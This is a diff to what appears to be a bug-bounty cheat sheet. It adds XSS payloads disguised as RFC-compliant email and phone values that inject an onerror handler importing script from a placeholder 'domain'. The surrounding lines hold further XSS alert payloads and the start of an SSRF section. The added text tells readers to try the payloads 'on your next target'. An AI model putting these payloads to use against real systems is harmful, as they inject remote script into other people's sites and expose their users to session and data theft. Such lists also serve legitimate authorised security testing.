@@ -122,6 +122,11 @@ www.google.com/complete/search?client=chrome&q=1&jsonp=alert(1)//
 alert?.(1)
 window&&=(window&&=opener||=alert)?.(1??0,)
 ```
+11-RFC-compliant payloads to try and put in your username or telephone number fields on your next target:
+```
+Email: "><img/src/onerror=import('//domain/')>"@domain.com
+Mobile: 013371337;ext=<img/src/onerror=import('//domain/')>
+```
 # SSRF
 1-Try other URL schemes:<br>
 ```
